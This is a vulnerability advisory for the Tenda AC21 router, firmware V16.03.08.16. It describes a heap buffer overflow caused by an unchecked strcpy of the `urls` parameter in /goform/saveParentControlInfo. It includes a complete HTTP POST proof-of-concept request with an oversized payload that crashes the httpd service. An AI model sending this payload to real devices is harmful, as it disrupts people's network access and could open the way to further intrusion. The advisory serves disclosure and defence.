**Affected Product**: Tenda AC21 Router

**Affected Firmware Versions**:  V16.03.08.16

**Vulnerability Type**: Buffer Overflow Vulnerability

------
### **Vulnerability Description**

In the latest firmware version V16.03.08.16 of the Tenda AC21 router, the `urls` parameter of `/goform/saveParentControlInfo` in the `/bin/httpd` binary contains a buffer overflow vulnerability that can lead to denial-of-service.


---
### **Vulnerability Details**

In the `httpd` binary, the function corresponding to `/goform/saveParentControlInfo` is `saveParentControlInfo`.
![[21.png]]

In the `saveParentControlInfo` function, `compare_parentcontrol_time` is called first. If the `time` parameter is non-empty and the start and end times differ, `compare_parentcontrol_time` returns `0` and execution enters the `if` branch. Inside that branch `ptr` is allocated on the heap with `malloc(0x254)` (a buffer of `0x254` bytes), and `get_parentControl_list_Info` is invoked afterwards.
![[17.png]]

In this function, the `webGetVar` function is first used to obtain the value of the `urls` parameter from `a1` and assign it to `v8`. Then, `strcpy` copies the data pointed to by `v8` to the heap buffer without any length check, resulting in a heap-based buffer overflow vulnerability.
![[18.png]]


---
### **PoC**
```
POST /goform/saveParentControlInfo HTTP/1.1
Host: 192.168.254.139
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1220
Origin: http://192.168.254.139
Connection: close
Referer: http://192.168.254.139/parental_control.html?random=0.0762097794856551&
Priority: u=0

deviceId=40%3Ac2%3Aba%3A44%3A9d%3A93&deviceName=qqq&enable=1&time=19%3A00-21%3A00&url_enable=1&urls=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&day=1%2C1%2C1%2C1%2C1%2C1%2C1&limit_type=1
```

After the request was sent, a segmentation fault occurred in the service:
![[19.png]]![[20.png]]
